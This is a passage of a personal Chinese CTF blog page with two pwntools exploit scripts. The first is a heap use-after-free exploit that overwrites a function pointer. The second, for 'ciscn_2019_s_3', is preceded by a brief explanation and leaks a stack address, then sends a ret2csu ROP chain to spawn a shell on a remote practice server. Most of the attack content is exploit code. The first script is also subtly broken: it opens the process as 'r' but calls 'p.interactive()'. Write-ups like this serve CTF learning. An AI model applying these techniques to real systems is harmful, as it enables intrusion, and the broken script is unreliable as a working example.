<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>这道题挺好玩的，要好好记录一下。</p>
<p>IDA翻译成C出来根本没法读，只能看汇编（汇编更容易看</p>
<p>主程序在<code>vuln</code>函数里，先从<code>%rsp - 0x10</code>的地址开始读入至多0x400个字符，然后输出0x30个字符，显然栈溢出。</p>
<p>然后还有个<code>gadget</code>函数，很清楚地能看出<code>mov $0xf, %rax</code>和<code>mov $0x3b, %rax</code>这两个gadget，第一个是sigreturn的调用号，第二个就是execve的调用号。</p>
<p>然后针对这两个gadgets，分别有SROP和利用通用gadget做ROP这两种方法。</p>
<p>SROP在网上看到的似乎打不通，就只用普通ROP的做法。</p>
<p>由于需要控制rdx，需要辛苦点用上通用gadget。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;28690&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end = <span class="number">0x40059a</span></span><br><span class="line">csu_front = <span class="number">0x400580</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">mov_rax_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">buf = p.recv()[:<span class="number">8</span>]</span><br><span class="line">leak_addr = u64(buf)</span><br><span class="line">binsh_addr = leak_addr - <span class="number">0x138</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(mov_rax_ret)</span><br><span class="line">payload += p64(csu_end) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front) + p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Garen Wang"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Garen Wang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Garen-Wang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Garen-Wang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:g4r3nwang@gmail.com" title="E-Mail → mailto:g4r3nwang@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>



      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备2022012256号 </a>
      <img src="/images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Garen Wang</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  



  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/live2dcubismcore.js"></script -->
  <!-- script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.2.2/js/bundle.js"></script -->

  <canvas id="live2d" width="400" height="400" style="position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999;"></canvas>
  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js"></script>
  <script>
    var resourcesPath = 'https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/';
    var backImageName = '';
    var modelDir = ['jiaran4'];
    initDefine(resourcesPath, backImageName, modelDir);
  </script>

</body>
</html>
